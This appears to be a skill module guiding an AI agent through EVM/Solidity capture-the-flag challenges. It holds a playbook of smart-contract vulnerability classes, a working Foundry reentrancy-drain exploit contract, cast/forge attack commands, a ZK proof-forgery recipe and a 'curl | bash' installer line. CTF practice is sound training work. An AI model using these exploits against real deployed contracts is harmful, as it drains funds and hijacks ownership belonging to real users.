# Skill Module: blockchain (smart contract)

Field manual for EVM/Solidity (and Vyper — same bytecode) CTF. Working files, by role: **contract mechanics & state layout → `notes/ANALYSIS.md`**; **the vuln + verbatim `isSolved()` win-condition + storage-slot map → `notes/VULN.md`**; **dead-ends, remote tx hashes, next moves → `notes/NEXT.md`**; **the exploit → `solver.py`** (a Foundry `forge script`, or a thin runner shelling `forge`/`cast`; `web3.py` is the fallback). Scratch → `tmp/`.

## Canonical shape — the win is on-chain state, not a crash

Nearly every EVM CTF ships this skeleton:
- A **`Setup` contract** that deploys the target(s) in its constructor (often seeding ETH/tokens) and exposes **`isSolved() → bool`** (aka `solved()`/`isComplete()`).
- A **target contract** holding the bug.
- `../chal_desc.md` gives you **RPC URL, chain id, a funded private key, the Setup address**, and a **flag endpoint** (`nc host port` / `GET /flag`) that returns the flag *only once `Setup.isSolved()` reads true on-chain*.

Many frameworks (paradigm/eth-challenge-base/kctf) instead give a **launcher socket**: `nc host port` presents a menu — `1` spins up a private instance and prints RPC/chain-id/privkey/Setup, `2` returns the flag after you solve. Launch first, capture those values into `notes/ANALYSIS.md`.

Your job: read `isSolved()`, work backward to the state it checks, find the one path an unprivileged caller can force it through, execute against the remote RPC, then poke the flag endpoint.

### First moves
```bash
cast --version || curl -L https://foundry.paradigm.xyz | bash   # forge/cast/anvil
ls                        # *.sol under src/? out/ artifacts? foundry.toml?
```
Record RPC/CHAIN_ID/PK/SETUP/flag endpoint in `notes/ANALYSIS.md`. Put the **verbatim `isSolved()` body** in `notes/VULN.md` — it is your spec. Pull only `isSolved()` and the target's state-mutating functions — never whole contracts.

## `isSolved()` is the spec — decompile your goal from it (→ `notes/VULN.md`)

| `isSolved()` checks | You must |
| --- | --- |
| `token.balanceOf(target)==0` / `address(target).balance==0` | drain the contract |
| `target.owner()==attacker` / `player` | hijack access control |
| `player balance > X` | mint / steal / inflate your balance |
| a boolean `pwned==true` | reach the guarded state-setter |
| `entrant==tx.origin`, `msg.sender==player` | pass a caller/origin gate |

**No source, only an address?** Enumerate then decompile from bytecode:
```bash
cast code $TARGET --rpc-url $RPC > bytecode.hex
cast selectors $(cat bytecode.hex)     # selectors present  |  cast 4byte 0xSEL → signature
```
Then reach for: **`heimdall`/`panoramix`/`evmole`** to decompile, **`slither`** for static findings, **`medusa`/`echidna`** to fuzz an invariant mirroring `isSolved()`, **`halmos`** to prove reachability symbolically. `cast storage <addr> <slot>` reads raw state when there's no getter.

## Rehearse-then-fire — the core loop (→ `solver.py`)

Remote nonces/gas are real and many challenges rate-limit or give one shot. Prove the win on a local fork first, then repoint the **same** script at the live node.
```bash
anvil --fork-url $RPC --fork-chain-id $CHAIN_ID &            # 1. mirror remote on :8545
forge script src/Exploit.s.sol --rpc-url localhost:8545 \
  --private-key $PK --broadcast -vvvv                        # 2. rehearse; script asserts isSolved()
cast call $SETUP "isSolved()(bool)" --rpc-url localhost:8545 # 3. confirm true on the fork
forge script src/Exploit.s.sol --rpc-url $RPC \
  --private-key $PK --broadcast -vvvv                        # 4. FIRE at the live node
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC           # 5. confirm true on remote
```
Then read the flag: launcher "get flag" option, or `curl $URL/flag`. **Web endpoints gating on wallet ownership** use a sign-in-with-Ethereum handshake:
```
GET  /api/auth/nonce                     → nonce
cast wallet sign --private-key $PK "<nonce-or-SIWE-msg>"   → personal_sign (EIP-191) sig
POST /login  {address, signature}        → session cookie / JWT  →  GET /flag
```
Some servers expect the full SIWE message, not the bare nonce — read the page's JS for exactly what's signed and posted.

## Foundry fast-path — one-shot reads/txs (keep multi-step in `solver.py`)

```bash
cast call  $SETUP  "isSolved()(bool)"                  --rpc-url $RPC
cast call  $TARGET "owner()(address)"                  --rpc-url $RPC
cast send  $TARGET "solve(uint256)" 42        --private-key $PK --rpc-url $RPC
cast send  $TARGET --value 1ether "deposit()" --private-key $PK --rpc-url $RPC
cast storage $TARGET 0                                 --rpc-url $RPC   # raw slot 0
cast wallet address --private-key $PK ; cast balance $(cast wallet address --private-key $PK) --rpc-url $RPC
# EIP-1967 proxy slots — read what the proxy actually points at:
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC  # impl
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103 --rpc-url $RPC  # admin
```
`web3.py` is the fallback for custom signing, raw calldata, or a bespoke flag protocol.

## Vulnerability classes — match the smell, confirm by reading (→ `notes/VULN.md`)

- **Access-control gap (check this FIRST).** Grep **every** `setGovernance`/`setImplementation`/`upgradeTo`/`init*`/`setOwner` for a missing/wrong modifier — the one critical setter with no `onlyOwner` is usually the bug. Unprotected setter + `delegatecall` = full storage control (see proxy section). Public `initialize()` never called → call it, become owner.
- **Reentrancy (the DAO).** External `.call{value:}` / ERC777-ERC721 receive hook fires *before* the balance is zeroed. Exploit = attacker contract whose `receive()`/`fallback()` re-enters `withdraw()` until the vault is dry. Also **read-only** (stale view consumed mid-call) and **cross-function** reentrancy.
- **Unchecked `delegatecall`.** Target `delegatecall`s an attacker-controlled address/calldata → your code runs with the target's storage and `address(this)`. Overwrite `owner`/slot 0/impl pointer.
- **`tx.origin` auth.** `require(tx.origin==owner)`. Phish: get `owner` to call your contract, which forwards to the target; `msg.sender`==you, `tx.origin`==owner. (Needs the owner to invoke you — some setups auto-call.)
- **Integer over/underflow.** Check `pragma`: `<0.8` w/o SafeMath → `balances[x]-=amt` underflows to huge; `>=0.8` only inside `unchecked{}`/inline asm.
- **Storage collision / uninitialized proxy.** Struct/mapping slot overlap; impl-slot vs logic-storage collision. Confirm which slot holds what with `cast storage`.
- **Weak randomness.** `block.timestamp`/`.number`/`blockhash`/`prevrandao`/`keccak(msg.sender,nonce)` are predictable. Recompute the same value **in the same block/tx** from an exploit contract and pass the winning input.
- **Signature replay / ecrecover.** Sig accepted without nonce/`chainid`/domain separator; `ecrecover` not checked for `address(0)` (forge a sig recovering to 0); malleable `s`. Replay a captured signature.
- **Flash-loan / spot-price oracle.** Asset priced off a spot AMM reserve (`getReserves`, `balanceOf(pair)`). Flash-borrow, skew the pool, act at the manipulated price, repay — all in one tx. TWAP/Chainlink ≠ this bug.
- **`selfdestruct` force-feed.** A contract asserting `address(this).balance==exact/0` is grieffable: force-send ETH bypassing `receive()` via `selfdestruct(target)` **from a constructor** (still works post-Cancun EIP-6780 — destruct in the same tx as create is exempt), or a pre-funded `create2` address.

## Proxies, delegatecall & storage layout

- **EIP-1967 slots** (impl/admin stored off the normal layout to dodge collisions): impl `0x360894…bbc`, admin `0xb531…103`. Read both with `cast storage $PROXY <slot>` to learn where logic and control actually live.
- **In a `delegatecall`, `address(this)` is the *proxy*** and **every storage read/write hits the proxy's slots**, not the logic contract's. So **unprotected setter + delegatecall = full control of proxy storage**: deploy an attacker "logic" contract whose layout places a field at the exact slot holding `owner` (slot 0 or 1), point the proxy at it, invoke the setter → your write lands on `owner`. Match the victim's slot layout variable-for-variable.
- **Uninitialized proxy** — if `initialize()`/`init()` is public and hasn't run, call it to seize `owner`/roles.
- **Derive a deployed child's address** without an event: `CREATE` → `keccak256(rlp.encode([deployer, nonce]))[-20:]` (first deploy is nonce 1 per EIP-161); `CREATE2` → `keccak256(0xff ++ deployer ++ salt ++ keccak256(initcode))[-20:]`. Python: `from eth_utils import keccak; import rlp`.

## Exploit skeleton (Foundry) — kept in `solver.py` / `src/Exploit.s.sol`

Reentrancy drain, broadcastable — asserts the win on the fork before you ever fire at remote:
```solidity
// forge script src/Exploit.s.sol --rpc-url $RPC --private-key $PK --broadcast -vvvv
import "forge-std/Script.sol";
interface IVault { function deposit() external payable; function withdraw() external; }
interface ISetup { function isSolved() external view returns (bool); function target() external view returns (address); }

contract Attacker {
    IVault v; address owner;
    constructor(address _v) payable { v = IVault(_v); owner = msg.sender; }
    function pwn() external { v.deposit{value: 1 ether}(); v.withdraw(); }
    receive() external payable {
        if (address(v).balance >= 1 ether) v.withdraw();          // re-enter until dry
        else payable(owner).transfer(address(this).balance);
    }
}
contract Exploit is Script {
    function run() external {
        ISetup s = ISetup(vm.envAddress("SETUP"));
        vm.startBroadcast();
        Attacker a = new Attacker{value: 1 ether}(s.target());
        a.pwn();
        vm.stopBroadcast();
        require(s.isSolved(), "not solved");                        // fail loud on the fork
    }
}
```
`export SETUP=0x…` then run; read the `-vvvv` trace to confirm the re-entrant loop and the final `isSolved()`.

One-shot when no contract is needed (predict-the-random style):
```bash
GUESS=$(cast call $TARGET "peek()(uint256)" --rpc-url $RPC)   # or reproduce with `cast keccak`
cast send $TARGET "guess(uint256)" $GUESS --private-key $PK --rpc-url $RPC
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC
```

## ZK (Groth16 / SNARK) challenges

- **Trusted-setup backdoor: `vk_delta_2 == vk_gamma_2`** in the verifying key → the pairing check collapses and **any statement verifies**. Forge a proof with `A = vk_alpha_1`, `B = vk_beta_2`, `C = -vk_x` (negate the accumulated public-input point on the curve). Submit → verifier passes with no witness.
- **Nullifier replay** — a valid proof accepted but the contract **doesn't record/track the nullifier** (or checks the wrong mapping) → replay the same proof/nullifier to double-spend/re-mint. Look for the `nullifierUsed[n]=true` write; if missing, replay.
- Extract the vk from constructor args or `cast storage`; do the curve math with `py_ecc` / snarkjs / arkworks.

## Category pitfalls

- **Read slots/selectors/hashes with `cast` — never type an address, storage value, or selector you haven't observed** (`cast storage`/`cast code`/`cast call`/`cast selectors`).
- **Fork-first.** Prove `isSolved()==true` on anvil before any remote tx; remote gas/nonces are real and often one-shot.
- **The flag comes from the endpoint, not the chain.** After `isSolved()` flips on the *real* RPC, hit the flag endpoint / launcher option / web login — it re-verifies on-chain and returns the flag. Keep a second hypothesis (raw vs. wrapped output) if the format looks off.
- Fork state is *real* remote state — a value read there is not a fake flag. The only fake flag is a placeholder from a local build.
